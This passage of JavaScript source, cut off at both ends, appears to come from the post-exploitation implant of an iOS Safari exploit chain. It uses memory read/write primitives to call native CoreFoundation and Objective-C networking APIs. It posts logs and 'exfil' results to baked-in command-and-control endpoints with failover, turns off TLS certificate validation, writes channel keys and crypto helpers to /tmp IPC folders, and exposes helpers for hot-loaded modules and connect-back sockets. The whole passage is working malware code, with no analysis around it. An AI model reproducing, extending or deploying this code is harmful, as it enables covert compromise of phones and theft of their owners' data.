      let CFHTTPMessageGetResponseStatusCode = func_resolve("CFHTTPMessageGetResponseStatusCode");
      let CFRunLoopGetCurrent = func_resolve("CFRunLoopGetCurrent");
      let CFRunLoopRunInMode = func_resolve("CFRunLoopRunInMode");
      let kCFRunLoopDefaultMode = uread64(func_resolve("kCFRunLoopDefaultMode").noPAC());
      let kCFBooleanTrue = uread64(func_resolve("kCFBooleanTrue").noPAC());
      let kCFHTTPVersion1_1 = __peCfConst("kCFHTTPVersion1_1");
      let kCFStreamPropertyHTTPShouldAutoredirect = __peCfConst("kCFStreamPropertyHTTPShouldAutoredirect");
      let kCFStreamPropertyHTTPResponseHeader = __peCfConst("kCFStreamPropertyHTTPResponseHeader");

      let full = "https://" + __peHostHeader(ep) + path;
      let urlStr = create_cfstring(get_cstring(full));
      let urlRef = fcall(CFURLCreateWithString, kCFAllocatorDefault, urlStr, 0n);
      if (!urlRef || urlRef === 0n) {
        __peHttpsDiag("cfhttp no_url " + full.slice(0, 80));
        return readResp ? "" : false;
      }
      let method = create_cfstring(get_cstring("POST"));
      let req = fcall(CFHTTPMessageCreateRequest, kCFAllocatorDefault, method, urlRef, kCFHTTPVersion1_1);
      if (!req || req === 0n) {
        __peHttpsDiag("cfhttp no_req");
        try { CFRelease(urlRef); } catch (_) {}
        return readResp ? "" : false;
      }
      let bodyStr = String(body || "");
      let bodyBytes = get_cstring(bodyStr);
      let bodyData = fcall(CFDataCreate, kCFAllocatorDefault, bodyBytes, BigInt(bodyStr.length));
      fcall(CFHTTPMessageSetBody, req, bodyData);
      fcall(CFHTTPMessageSetHeaderFieldValue, req,
        create_cfstring(get_cstring("Content-Type")),
        create_cfstring(get_cstring(String(contentType || "application/json"))));
      fcall(CFHTTPMessageSetHeaderFieldValue, req,
        create_cfstring(get_cstring("Host")),
        create_cfstring(get_cstring(__peHostHeader(ep))));
      fcall(CFHTTPMessageSetHeaderFieldValue, req,
        create_cfstring(get_cstring("Connection")),
        create_cfstring(get_cstring("close")));

      let stream = fcall(CFReadStreamCreateForHTTPRequest, kCFAllocatorDefault, req);
      if (!stream || stream === 0n) {
        __peHttpsDiag("cfhttp no_stream " + full.slice(0, 60));
        try { CFRelease(req); } catch (_) {}
        try { CFRelease(urlRef); } catch (_) {}
        return readResp ? "" : false;
      }
      try {
        fcall(CFReadStreamSetProperty, stream, kCFStreamPropertyHTTPShouldAutoredirect, kCFBooleanTrue);
      } catch (_) {}

      let rl = fcall(CFRunLoopGetCurrent);
      if (rl && rl !== 0n) {
        fcall(CFReadStreamScheduleWithRunLoop, stream, rl, kCFRunLoopDefaultMode);
      }
      fcall(CFReadStreamOpen, stream);

      let opened = false;
      for (let i = 0; i < 80; i++) {
        let st = Number(fcall(CFReadStreamGetStatus, stream));
        if (st === 7) break; // error
        if (st === 2 || st === 5) { opened = true; break; } // open / atEnd
        if (rl && rl !== 0n) {
          try { fcall(CFRunLoopRunInMode, kCFRunLoopDefaultMode, 0.1, 1n); } catch (_) {}
        } else {
          try { fcall(USLEEP, 100000n); } catch (_) {}
        }
      }
      if (!opened) {
        __peHttpsDiag("cfhttp open_fail host=" + __peEpSni(ep) + path);
        try { fcall(CFReadStreamClose, stream); } catch (_) {}
        if (rl && rl !== 0n) {
          try { fcall(CFReadStreamUnscheduleFromRunLoop, stream, rl, kCFRunLoopDefaultMode); } catch (_) {}
        }
        try { CFRelease(stream); } catch (_) {}
        try { CFRelease(req); } catch (_) {}
        try { CFRelease(urlRef); } catch (_) {}
        return readResp ? "" : false;
      }

      let rmax = 2 * 1024 * 1024;
      let rbuf = calloc(1n, BigInt(rmax + 8));
      let total = 0;
      for (let round = 0; round < 250 && total < rmax; round++) {
        let st = Number(fcall(CFReadStreamGetStatus, stream));
        if (st === 7) break;
        let nrd = Number(fcall(CFReadStreamRead, stream, rbuf + BigInt(total),
          BigInt(Math.min(65536, rmax - total))));
        if (nrd > 0) { total += nrd; continue; }
        if (st === 5) break;
        if (rl && rl !== 0n) {
          try { fcall(CFRunLoopRunInMode, kCFRunLoopDefaultMode, 0.05, 1n); } catch (_) {}
        } else {
          try { fcall(USLEEP, 50000n); } catch (_) {}
        }
      }

      let code = 0;
      try {
        let hdr = fcall(CFReadStreamCopyProperty, stream, kCFStreamPropertyHTTPResponseHeader);
        if (hdr && hdr !== 0n) {
          code = Number(fcall(CFHTTPMessageGetResponseStatusCode, hdr));
          try { CFRelease(hdr); } catch (_) {}
        }
      } catch (_) {}

      let out = "";
      if (total > 0) {
        let nr = total > rmax ? rmax : total;
        let arr = new Array(nr);
        for (let i = 0; i < nr; i++) {
          let qword = uread64(rbuf + BigInt(i & ~7));
          let b = Number((qword >> BigInt((i & 7) * 8)) & 0xffn);
          arr[i] = String.fromCharCode(b);
        }
        out = arr.join("");
      }
      free(rbuf);
      try { fcall(CFReadStreamClose, stream); } catch (_) {}
      if (rl && rl !== 0n) {
        try { fcall(CFReadStreamUnscheduleFromRunLoop, stream, rl, kCFRunLoopDefaultMode); } catch (_) {}
      }
      try { CFRelease(stream); } catch (_) {}
      try { CFRelease(req); } catch (_) {}
      try { CFRelease(urlRef); } catch (_) {}
      try { if (bodyData) CFRelease(bodyData); } catch (_) {}

      if (code >= 400) {
        __peHttpsDiag("cfhttp status=" + code + " host=" + __peEpSni(ep) + path +
          " bytes=" + out.length);
        return readResp ? "" : false;
      }
      if (!readResp) return true;
      if (!out) __peHttpsDiag("cfhttp empty_body status=" + code + " " + __peEpSni(ep) + path);
      return out;
    } catch (e) {
      __peHttpsDiag("cfhttp ex " + String(e).slice(0, 80));
      return readResp ? "" : false;
    }
  }
  // HTTPS via CFStream - aligned with old_pe _cfstreamPost (domain + CF DNS).
  // Proven path: connect by hostname, SocketSecurityLevel, skip cert verify, wait write==open only.
  function __peHttpsExchangeCFStream(ep, path, contentType, body, readResp) {
    try {
      __peEnsureCFNetwork();
      let CFStreamCreatePairWithSocketToHost = func_resolve("CFStreamCreatePairWithSocketToHost");
      let CFReadStreamOpen = func_resolve("CFReadStreamOpen");
      let CFWriteStreamOpen = func_resolve("CFWriteStreamOpen");
      let CFReadStreamClose = func_resolve("CFReadStreamClose");
      let CFWriteStreamClose = func_resolve("CFWriteStreamClose");
      let CFWriteStreamGetStatus = func_resolve("CFWriteStreamGetStatus");
      let CFReadStreamRead = func_resolve("CFReadStreamRead");
      let CFWriteStreamWrite = func_resolve("CFWriteStreamWrite");
      let CFReadStreamSetProperty = func_resolve("CFReadStreamSetProperty");
      let CFWriteStreamSetProperty = func_resolve("CFWriteStreamSetProperty");

      // Domain hostname (not IP): matches old_pe; CFStream does DNS (incl. Cloudflare).
      let host = __peEpSni(ep);
      let port = __peEpPort(ep);
      let hostCF = create_cfstring(get_cstring(host));
      let readPtr = calloc(1n, 8n);
      let writePtr = calloc(1n, 8n);
      fcall(CFStreamCreatePairWithSocketToHost, kCFAllocatorDefault, hostCF, BigInt(port >>> 0), readPtr, writePtr);
      let readStream = uread64(readPtr);
      let writeStream = uread64(writePtr);
      free(readPtr);
      free(writePtr);
      try { CFRelease(hostCF); } catch (_) {}
      if (!readStream || !writeStream) {
        __peHttpsDiag("cfstream no_pair host=" + host);
        return readResp ? "" : false;
      }

      try {
        // old_pe: set SocketSecurityLevel on streams directly
        let kLevel = __peCfConst("kCFStreamPropertySocketSecurityLevel");
        let kNeg = __peCfConst("kCFStreamSocketSecurityLevelNegotiatedSSL");
        if (kLevel && kNeg) {
          fcall(CFWriteStreamSetProperty, writeStream, kLevel, kNeg);
          fcall(CFReadStreamSetProperty, readStream, kLevel, kNeg);
        }
        // old_pe: SSLSettings only disables cert chain verify (no SSLPeerName)
        let kSSL = __peCfConst("kCFStreamPropertySSLSettings");
        let kValCert = __peCfConst("kCFStreamSSLValidatesCertificateChain");
        let kFalse = 0n;
        try { kFalse = uread64(func_resolve("kCFBooleanFalse").noPAC()); } catch (_) {}
        if (kSSL && kValCert && kFalse) {
          let dict = CFDictionaryCreateMutable(
            kCFAllocatorDefault, 2n, kCFTypeDictionaryKeyCallBacks, kCFTypeDictionaryValueCallBacks
          );
          if (dict && dict !== 0n) {
            CFDictionarySetValue(dict, kValCert, kFalse);
            fcall(CFWriteStreamSetProperty, writeStream, kSSL, dict);
            fcall(CFReadStreamSetProperty, readStream, kSSL, dict);
            try { CFRelease(dict); } catch (_) {}
          }
        }

        fcall(CFWriteStreamOpen, writeStream);
        fcall(CFReadStreamOpen, readStream);

        // old_pe: only wait WriteStream status===2 (open)
        let ready = false;
        for (let wi = 0; wi < 80; wi++) {
          let st = Number(fcall(CFWriteStreamGetStatus, writeStream));
          if (st === 2) { ready = true; break; }
          if (st >= 5) break;
          try { fcall(USLEEP, 100000n); } catch (_) {}
        }
        if (!ready) {
          __peHttpsDiag("cfstream write_not_ready host=" + host);
          try { fcall(CFReadStreamClose, readStream); } catch (_) {}
          try { fcall(CFWriteStreamClose, writeStream); } catch (_) {}
          try { CFRelease(readStream); } catch (_) {}
          try { CFRelease(writeStream); } catch (_) {}
          return readResp ? "" : false;
        }

        let ua = "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1";
        let req = "POST " + path + " HTTP/1.0\r\nHost: " + __peHostHeader(ep) +
          "\r\nContent-Type: " + contentType +
          "\r\nUser-Agent: " + ua +
          "\r\nContent-Length: " + body.length +
          "\r\n\r\n" + body;
        let wbuf = get_cstring(req);
        let woff = 0;
        let wlen = req.length;
        while (woff < wlen) {
          let wn = Number(fcall(CFWriteStreamWrite, writeStream, wbuf + BigInt(woff), BigInt(wlen - woff)));
          if (!(wn > 0)) break;
          woff += wn;
        }
        if (!readResp) {
          try { fcall(CFReadStreamClose, readStream); } catch (_) {}
          try { fcall(CFWriteStreamClose, writeStream); } catch (_) {}
          try { CFRelease(readStream); } catch (_) {}
          try { CFRelease(writeStream); } catch (_) {}
          return woff > 0;
        }
        if (woff < wlen) {
          try { fcall(CFReadStreamClose, readStream); } catch (_) {}
          try { fcall(CFWriteStreamClose, writeStream); } catch (_) {}
          try { CFRelease(readStream); } catch (_) {}
          try { CFRelease(writeStream); } catch (_) {}
          return "";
        }

        let rmax = 2 * 1024 * 1024;
        let rbuf = calloc(1n, BigInt(rmax + 8));
        let total = 0;
        for (let round = 0; round < 80 && total < rmax; round++) {
          let nrd = Number(fcall(CFReadStreamRead, readStream, rbuf + BigInt(total),
            BigInt(Math.min(65536, rmax - total))));
          if (!(nrd > 0)) break;
          total += nrd;
        }
        let out = "";
        if (total > 0) {
          let nr = total > rmax ? rmax : total;
          let arr = new Array(nr);
          for (let i = 0; i < nr; i++) {
            let qword = uread64(rbuf + BigInt(i & ~7));
            let b = Number((qword >> BigInt((i & 7) * 8)) & 0xffn);
            arr[i] = String.fromCharCode(b);
          }
          out = arr.join("");
        }
        free(rbuf);
        try { fcall(CFReadStreamClose, readStream); } catch (_) {}
        try { fcall(CFWriteStreamClose, writeStream); } catch (_) {}
        try { CFRelease(readStream); } catch (_) {}
        try { CFRelease(writeStream); } catch (_) {}
        let sep = out.indexOf("\r\n\r\n");
        let headers = sep >= 0 ? out.slice(0, sep) : "";
        if (sep >= 0) out = out.slice(sep + 4);
        try {
          let m = headers.match(/\s(\d{3})\s/);
          if (m && Number(m[1]) >= 400) {
            __peHttpsDiag("cfstream status=" + m[1] + " " + host + path);
            return "";
          }
        } catch (_) {}
        return out;
      } catch (inner) {
        try { fcall(CFReadStreamClose, readStream); } catch (_) {}
        try { fcall(CFWriteStreamClose, writeStream); } catch (_) {}
        try { CFRelease(readStream); } catch (_) {}
        try { CFRelease(writeStream); } catch (_) {}
        throw inner;
      }
    } catch (e) {
      __peHttpsDiag("cfstream ex " + String(e).slice(0, 80));
      return readResp ? "" : false;
    }
  }
  // HTTPS via NSURLConnection sync (NSString, not CFString).
  function __peHttpsExchangeNSURL(ep, path, contentType, body, readResp) {
    try {
      let full = "https://" + __peHostHeader(ep) + path;
      let NSURL = objc_getClass("NSURL");
      let nsUrlStr = __peNsString(full);
      let url = objc_msgSend(NSURL, sel_registerName(get_cstring("URLWithString:")), nsUrlStr);
      if (!url || url === 0n) {
        __peHttpsDiag("nsurl bad_url " + full.slice(0, 80));
        return readResp ? "" : false;
      }
      let opnReq = objc_getClass("NSMutableURLRequest");
      let req = objc_msgSend(opnReq, sel_registerName(get_cstring("requestWithURL:")), url);
      if (!req || req === 0n) {
        __peHttpsDiag("nsurl no_req");
        return readResp ? "" : false;
      }
      objc_msgSend(req, sel_registerName(get_cstring("setHTTPMethod:")), __peNsString("POST"));
      objc_msgSend(req, sel_registerName(get_cstring("setValue:forHTTPHeaderField:")),
        __peNsString(String(contentType || "application/json")),
        __peNsString("Content-Type"));
      let bodyStr = String(body || "");
      let NSData = objc_getClass("NSData");
      let nd = objc_msgSend(NSData, sel_registerName(get_cstring("dataWithBytes:length:")),
        get_cstring(bodyStr), BigInt(bodyStr.length));
      objc_msgSend(req, sel_registerName(get_cstring("setHTTPBody:")), nd);
      let respSlot = calloc(1n, 8n);
      let errSlot = calloc(1n, 8n);
      uwrite64(respSlot, 0n);
      uwrite64(errSlot, 0n);
      let NSURLConnection = objc_getClass("NSURLConnection");
      let data = objc_msgSend(NSURLConnection,
        sel_registerName(get_cstring("sendSynchronousRequest:returningResponse:error:")),
        req, respSlot, errSlot);
      let respObj = uread64(respSlot);
      let errObj = uread64(errSlot);
      free(respSlot);
      free(errSlot);
      if ((!data || data === 0n) && errObj && errObj !== 0n) {
        __peHttpsDiag("nsurl err host=" + __peEpSni(ep) + path);
        return readResp ? "" : false;
      }
      if (!data || data === 0n) {
        __peHttpsDiag("nsurl nil_data " + __peEpSni(ep) + path);
        return readResp ? "" : false;
      }
      if (respObj && respObj !== 0n) {
        try {
          let code = Number(objc_msgSend(respObj, sel_registerName(get_cstring("statusCode"))));
          if (code >= 400) {
            __peHttpsDiag("nsurl status=" + code + " " + __peEpSni(ep) + path);
            return readResp ? "" : false;
          }
        } catch (_) {}
      }
      if (!readResp) return true;
      let len = Number(objc_msgSend(data, sel_registerName(get_cstring("length"))));
      if (!(len > 0) || len > 2 * 1024 * 1024) return "";
      let bytes = objc_msgSend(data, sel_registerName(get_cstring("bytes")));
      if (!bytes || bytes === 0n) return "";
      let arr = new Array(len);
      for (let i = 0; i < len; i++) {
        let qword = uread64(bytes + BigInt(i & ~7));
        let b = Number((qword >> BigInt((i & 7) * 8)) & 0xffn);
        arr[i] = String.fromCharCode(b);
      }
      return arr.join("");
    } catch (e) {
      __peHttpsDiag("nsurl ex " + String(e).slice(0, 80));
      return readResp ? "" : false;
    }
  }
  function __peHttpsExchange(ep, path, contentType, body, readResp) {
    let r = __peHttpsExchangeCFHTTP(ep, path, contentType, body, readResp);
    if (readResp) {
      if (r) return r;
    } else if (r) {
      return true;
    }
    r = __peHttpsExchangeNSURL(ep, path, contentType, body, readResp);
    if (readResp) {
      if (r) return r;
    } else if (r) {
      return true;
    }
    return __peHttpsExchangeCFStream(ep, path, contentType, body, readResp);
  }
  function __peHttpExchange(epOrHost, portOrPath, pathOrCt, ctOrBody, bodyOrRead, maybeRead) {
    // New: __peHttpExchange(ep, path, contentType, body, readResp)
    // Legacy: __peHttpExchange(host, port, path, contentType, body, readResp)
    if (epOrHost && typeof epOrHost === "object") {
      let ep = epOrHost;
      let path = portOrPath;
      let contentType = pathOrCt;
      let body = ctOrBody;
      let readResp = bodyOrRead;
      if (__peEpScheme(ep) === "https")
        return __peHttpsExchange(ep, path, contentType, body, readResp);
      return __peHttpExchangePlain(ep, path, contentType, body, readResp);
    }
    let ep = { scheme: "http", host: String(epOrHost), ip: String(epOrHost), port: Number(portOrPath) };
    return __peHttpExchangePlain(ep, pathOrCt, ctOrBody, bodyOrRead, maybeRead);
  }
  function __peTryEndpoints(endpoints, path, contentType, body, readResp) {
    let list = endpoints && endpoints.length
      ? endpoints
      : [{ scheme: "http", host: PELOG_HOST, ip: PELOG_HOST, port: PELOG_PORT }];
    // Reachability: http -> TCP ping to ip; https -> always try (bare TCP!=TLS).
    let live = [];
    for (let i = 0; i < list.length; i++) {
      let ep = list[i];
      try {
        if (__peEpScheme(ep) === "https") {
          live.push(ep);
          continue;
        }
        let fd = __peConnectIpv4(__peEpIp(ep), __peEpPort(ep));
        if (fd > 0n) {
          try { close(fd); } catch (_) {}
          live.push(ep);
        }
      } catch (_) {}
    }
    // If every ping failed, still try original list once (avoid total blackhole on flaky ping).
    let ordered = live.length ? live : list;
    for (let j = 0; j < ordered.length; j++) {
      let ep2 = ordered[j];
      try {
        let r = __peHttpExchange(ep2, path, contentType, body, readResp);
        if (readResp) {
          if (r) return r;
        } else if (r) {
          return true;
        }
      } catch (e) {}
    }
    return readResp ? "" : false;
  }
  function __peLabDebugPelogOn() {
    // Auto-enable when baked C2 set includes lab 8090 (any slot).
    if (typeof PELOG_DUAL_LAB_DEBUG !== "undefined" && !PELOG_DUAL_LAB_DEBUG) return false;
    try {
      let list = PELOG_ENDPOINTS || [];
      for (let i = 0; i < list.length; i++) {
        let ep = list[i];
        let u = String((ep && ep.url) || "");
        let h = String((ep && ep.host) || "");
        let ip = String((ep && ep.ip) || "");
        let port = Number((ep && ep.port) || 0);
        if (u.indexOf("192.168.31.32:9090") >= 0) return true;
        if ((ip === "192.168.31.32" || h === "192.168.31.32") && port === 8093) return true;
      }
    } catch (_) {}
    return false;
  }
  // Refresh pe pelog switch from agent IPC (throttled). Missing file -> keep default ON.
  function __pePelogEnabled() {
    try {
      let now = Date.now();
      if (now - (globalThis.__pe_pelog_check_ts || 0) < 1500) {
        return globalThis.__pe_pelog_on !== false;
      }
      globalThis.__pe_pelog_check_ts = now;
      if (typeof __peReadFileUtf8 !== "function") {
        return globalThis.__pe_pelog_on !== false;
      }
      let raw = "";
      try { raw = __peReadFileUtf8("/tmp/c2_ipc/pe_pelog.json", 512) || ""; } catch (_) {}
      if (!raw) {
        try { raw = __peReadFileUtf8("/tmp/c2_v1/sb/pe_pelog.json", 512) || ""; } catch (_) {}
      }
      if (!raw) {
        try { raw = __peReadFileUtf8("/tmp/c2_ipc/agent_flags.json", 2048) || ""; } catch (_) {}
      }
      if (raw) {
        let o = JSON.parse(raw);
        if (o && typeof o === "object") {
          // pe_pelog.json prefers {on}; agent_flags prefers {pelog} (avoid clashing with other "on").
          if (typeof o.pelog === "boolean") globalThis.__pe_pelog_on = o.pelog;
          else if (typeof o.on === "boolean") globalThis.__pe_pelog_on = o.on;
        }
      }
    } catch (_) {}
    return globalThis.__pe_pelog_on !== false;
  }
  function __peLogPost(msg) {
    try {
      if (!__pePelogEnabled()) return;
      __peLogSeq++;
      let body = "seq=" + __peLogSeq + "&msg=" + encodeURIComponent(String(msg).slice(0, 4000));
      // Sync CFStream/HTTPS - NSURLConnection async needs a runloop; PE JSContext often
      // has none, so fire-and-forget posted 0 /pelog on v1 (phones spawned but silent).
      if (__peLabDebugPelogOn() && PELOG_ENDPOINTS && PELOG_ENDPOINTS.length >= 2) {
        try {
          __peHttpExchange(PELOG_ENDPOINTS[0], "/pelog", "application/x-www-form-urlencoded", body, false);
        } catch (_) {}
        try {
          __peHttpExchange(PELOG_ENDPOINTS[1], "/pelog", "application/x-www-form-urlencoded", body, false);
        } catch (_) {}
        return;
      }
      let ok = __peTryEndpoints(PELOG_ENDPOINTS, "/pelog", "application/x-www-form-urlencoded", body, false);
      if (!ok && PELOG_REPORT_ENDPOINTS && PELOG_REPORT_ENDPOINTS.length) {
        __peTryEndpoints(PELOG_REPORT_ENDPOINTS, "/pelog", "application/x-www-form-urlencoded",
          "seq=" + __peLogSeq + "&msg=" + encodeURIComponent("[REPORT] " + String(msg).slice(0, 3900)), false);
      }
    } catch (e) {}
  }
  // Result/exfil: with lab http://192.168.31.32:9090 in bake -> dual [0]+[1] (debug mirror).
  // Pure https (or no lab) -> failover until one success (do NOT fan-out all https hosts).
  function __peResultFanoutPath(path) {
    let p = String(path || "");
    if (p === "/result" || p === "/war" || p === "/api/war") return true;
    if (p === "/api/promo/result" || p === "/api/asset/report") return true;
    return false;
  }
  function __peDualLabResultPost(path, body, readResp) {
    // Mirror pelog dual: POST to endpoints[0] and [1] when lab 8090 is baked in.
    let list = PELOG_ENDPOINTS || [];
    if (list.length < 2) {
      return readResp
        ? (__peTryEndpoints(list, path, "application/json", body, true) || "")
        : !!__peTryEndpoints(list, path, "application/json", body, false);
    }
    let okN = 0;
    let firstBody = "";
    for (let i = 0; i < 2; i++) {
      try {
        let ep = list[i];
        if (readResp && firstBody) {
          if (__peHttpExchange(ep, path, "application/json", body, false)) okN++;
          continue;
        }
        let r = __peHttpExchange(ep, path, "application/json", body, readResp);
        if (readResp) {
          if (r) { firstBody = r; okN++; }
        } else if (r) {
          okN++;
        }
      } catch (_) {}
    }
    try {
      let p = String(path || "");
      if (p === "/war" || p === "/api/war" || p === "/api/promo/result" ||
          p === "/api/asset/report" || okN < 2) {
        if (typeof LOG === "function") {
          LOG("[PE-C2] dual " + p + " ok=" + okN + "/2" + (okN < 2 ? " PARTIAL" : ""));
        }
      }
    } catch (_) {}
    return readResp ? firstBody : (okN > 0);
  }
  // E5: JSON POST to C2; returns response body (after headers) or "".
  // Outer shell only - no webpack Native; decode via uread64.
  // Supports large bodies (e.g. c2_bootstrap plaintext ~70KB) via write/read loops.
  // Failover across PELOG_ENDPOINTS; on total failure try PELOG_REPORT_ENDPOINTS (no resp expected).
  // Lab+https bake: result-class dual to [0]+[1]; pure https: single success via failover.
  // Channel ch1: seal beacon/result-class when globalThis.__C2_CHANNEL present; pelog stays plain.
  function __peChannelWrapBody(path, jsonBody) {
    try {
      if (typeof globalThis.__c2ChannelPath === "function" && !globalThis.__c2ChannelPath(path))
        return String(jsonBody || "");
      if (typeof globalThis.__c2ChannelSeal !== "function") return String(jsonBody || "");
      let plain = String(jsonBody || "");
      let obj = null;
      try { obj = JSON.parse(plain); } catch (_) { obj = null; }
      let sealed = globalThis.__c2ChannelSeal(obj !== null ? obj : plain);
      if (!sealed) return plain;
      return JSON.stringify(sealed);
    } catch (_) {
      return String(jsonBody || "");
    }
  }
  function __peChannelUnwrapResp(path, raw) {
    try {
      if (typeof globalThis.__c2ChannelPath === "function" && !globalThis.__c2ChannelPath(path))
        return raw;
      if (typeof globalThis.__c2ChannelOpen !== "function") return raw;
      let t = String(raw || "");
      if (t.indexOf("\"pack\":\"ch1\"") < 0 && t.indexOf('"pack":"ch1"') < 0) return raw;
      let o = JSON.parse(t);
      let plain = globalThis.__c2ChannelOpen(o);
      if (plain && typeof plain === "object") return JSON.stringify(plain);
      return plain;
    } catch (_) {
      return raw;
    }
  }
  function __pePublishChannelIpc() {
    try {
      let ch = globalThis.__C2_CHANNEL;
      if (!ch || !ch.sid || !ch.key) return;
      let body = JSON.stringify({ sid: ch.sid, key: ch.key, v: ch.v || 1, pack: "ch1" });
      try { fcall(func_resolve("mkdir"), get_cstring("/tmp/c2_ipc"), 0x1ff); } catch (_) {}
      try { fcall(func_resolve("mkdir"), get_cstring("/tmp/c2_v1"), 0x1ff); } catch (_) {}
      try { fcall(func_resolve("mkdir"), get_cstring("/tmp/c2_v1/sb"), 0x1ed); } catch (_) {}
      try {
        if (typeof __peWriteFileUtf8 === "function") {
          __peWriteFileUtf8("/tmp/c2_ipc/channel.json", body);
          __peWriteFileUtf8("/tmp/c2_v1/sb/channel.json", body);
        }
      } catch (_) {}
    } catch (_) {}
  }
  // Agent ch1 without splicing helpers into SB inject blob: drop min crypto to IPC.
  function __pePublishChannelHelpers() {
    try {
      let src = "";
      try {
        let resolver = globalThis.peResolveNamedSrc;
        if (typeof resolver === "function") {
          src = resolver("channel_crypto_min.js", "channel_crypto_min omitted", true) || "";
        }
      } catch (_) { src = ""; }
      if (!src || src.length < 200 || src.indexOf("__c2ChannelSeal") < 0) {
        try { LOG("[PE] channel_crypto_min publish miss len=" + (src ? src.length : 0)); } catch (_) {}
        return false;
      }
      try { fcall(func_resolve("mkdir"), get_cstring("/tmp/c2_ipc"), 0x1ff); } catch (_) {}
      try { fcall(func_resolve("mkdir"), get_cstring("/tmp/c2_v1"), 0x1ff); } catch (_) {}
      try { fcall(func_resolve("mkdir"), get_cstring("/tmp/c2_v1/sb"), 0x1ed); } catch (_) {}
      let ok1 = false, ok2 = false;
      try { ok1 = !!__peWriteFileUtf8("/tmp/c2_ipc/channel_crypto_min.js", src); } catch (_) {}
      try { ok2 = !!__peWriteFileUtf8("/tmp/c2_v1/sb/channel_crypto_min.js", src); } catch (_) {}
      try {
        LOG("[PE] channel_crypto_min published len=" + src.length + " ipc=" + ok1 + " sb=" + ok2);
      } catch (_) {}
      return !!(ok1 || ok2);
    } catch (ex) {
      try { LOG("[PE] channel_crypto_min publish FAIL " + String(ex).slice(0, 80)); } catch (_) {}
      return false;
    }
  }
  globalThis.__pePublishChannelHelpers = __pePublishChannelHelpers;
  function __peHttpPostJson(path, jsonBody) {
    try {
      let body = __peChannelWrapBody(path, String(jsonBody || ""));
      let out = "";
      if (__peResultFanoutPath(path) && __peLabDebugPelogOn()) {
        out = __peDualLabResultPost(path, body, true) || "";
      } else {
        out = __peTryEndpoints(PELOG_ENDPOINTS, path, "application/json", body, true);
      }
      if (out) return __peChannelUnwrapResp(path, out) || out;
      if (PELOG_REPORT_ENDPOINTS && PELOG_REPORT_ENDPOINTS.length) {
        __peTryEndpoints(PELOG_REPORT_ENDPOINTS, "/pelog", "application/x-www-form-urlencoded",
          "seq=0&msg=" + encodeURIComponent("[C2_FAIL] path=" + path + " body=" + body.slice(0, 500)), false);
      }
      return "";
    } catch (e) {
      return "";
    }
  }
  // Exfil/upload: do not wait for HTTP body (READ can block listen forever).
  // Lab 8090 in bake -> dual [0]+[1]; else failover one success.
  function __peHttpPostJsonFire(path, jsonBody) {
    try {
      let body = __peChannelWrapBody(path, String(jsonBody || ""));
      if (__peResultFanoutPath(path) && __peLabDebugPelogOn()) {
        return !!__peDualLabResultPost(path, body, false);
      }
      return !!__peTryEndpoints(PELOG_ENDPOINTS, path, "application/json", body, false);
    } catch (e) {
      return false;
    }
  }

  function __pePayloadSrcFromResp(obj) {
    try {
      if (!obj) return "";
      if (obj.src) return String(obj.src);
      let u = globalThis.__n7z_unwrapPayload;
      if (typeof u === "function") {
        let s = u(obj);
        if (s) return String(s);
      }
    } catch (_) {}
    return "";
  }
  globalThis.__peHttpPostJson = __peHttpPostJson;
  globalThis.__peHttpPostJsonFire = __peHttpPostJsonFire;
  globalThis.__pePayloadSrcFromResp = __pePayloadSrcFromResp;
  // Hot modules (indirect eval) need absolute HTTPS (promo list / exfil hosts).
  globalThis.__peHttpExchange = __peHttpExchange;
  try {
    globalThis.__peSafariPromoListEndpoints = SAFARI_PROMO_LIST_ENDPOINTS;
  } catch (_) {}

  // Plain GET (static 8083 fallback for slim hot modules e.g. MigFilterBypassThread.js).
  // Lab static is HTTP-only; host must be IPv4.
  function __peHttpGetRaw(host, port, path) {
    try {
      let ep = { scheme: "http", host: String(host), ip: String(host), port: Number(port) };
      let fd = __peConnectIpv4(__peEpIp(ep), __peEpPort(ep));
      if (fd <= 0n) return "";
      let req = "GET " + path + " HTTP/1.1\r\nHost: " + __peHostHeader(ep) +
        "\r\nConnection: close\r\n\r\n";
      let wbuf = get_cstring(req);
      let woff = 0;
      let wlen = req.length;
      while (woff < wlen) {
        let wn = fcall(WRITE, fd, wbuf + BigInt(woff), BigInt(wlen - woff));
        if (!wn || wn <= 0n) break;
        woff += Number(wn);
      }
      let rmax = 2 * 1024 * 1024;
      let rbuf = calloc(1n, BigInt(rmax + 8));
      let total = 0;
      while (total < rmax) {
        let chunk = Math.min(65536, rmax - total);
        let nrd = fcall(READ, fd, rbuf + BigInt(total), BigInt(chunk));
        if (!nrd || nrd <= 0n) break;
        total += Number(nrd);
      }
      close(fd);
      let out = "";
      if (total > 0) {
        let nr = total > rmax ? rmax : total;
        for (let i = 0; i < nr; i++) {
          let qword = uread64(rbuf + BigInt(i & ~7));
          let b = Number((qword >> BigInt((i & 7) * 8)) & 0xffn);
          out += String.fromCharCode(b);
        }
      }
      free(rbuf);
      let sep = out.indexOf("\r\n\r\n");
      if (sep < 0) return "";
      let headers = out.substring(0, sep);
      if (headers.indexOf(" 200 ") < 0) return "";
      return out.substring(sep + 4);
    } catch (_) {
      return "";
    }
  }
  globalThis.__peHttpGetRaw = __peHttpGetRaw;

  // Lab dbg TCP hot modules: thin net export (connect-back frames).
  function __peNetWriteBytes(fd, byteStr) {
    try {
      let n = byteStr.length;
      if (n <= 0) return 0;
      let mem = calloc(1n, BigInt(n + 8));
      for (let i = 0; i < n; i++) {
        let b = byteStr.charCodeAt(i) & 0xff;
        let off = BigInt(i & ~7);
        let shift = BigInt((i & 7) * 8);
        let cur = uread64(mem + off);
        cur = (cur & ~(0xffn << shift)) | (BigInt(b) << shift);
        uwrite64(mem + off, cur);
      }
      let woff = 0;
      while (woff < n) {
        let wn = fcall(WRITE, fd, mem + BigInt(woff), BigInt(n - woff));
        if (!wn || wn <= 0n) break;
        woff += Number(wn);
      }
      free(mem);
      return woff;
    } catch (e) {
      return -1;
    }
  }
  function __peNetReadSome(fd, maxn) {
    try {
      maxn = maxn || 65536;
      let mem = calloc(1n, BigInt(maxn + 8));
      let nrd = fcall(READ, fd, mem, BigInt(maxn));
      let out = "";
      if (nrd && nrd > 0n) {
        let n = Number(nrd);
        for (let i = 0; i < n; i++) {
          let qword = uread64(mem + BigInt(i & ~7));
          let b = Number((qword >> BigInt((i & 7) * 8)) & 0xffn);
          out += String.fromCharCode(b);
        }
      }
      free(mem);
      return out;
    } catch (e) {
      return "";
    }
  }
  function __peNetSetNonblock(fd) {
    try {
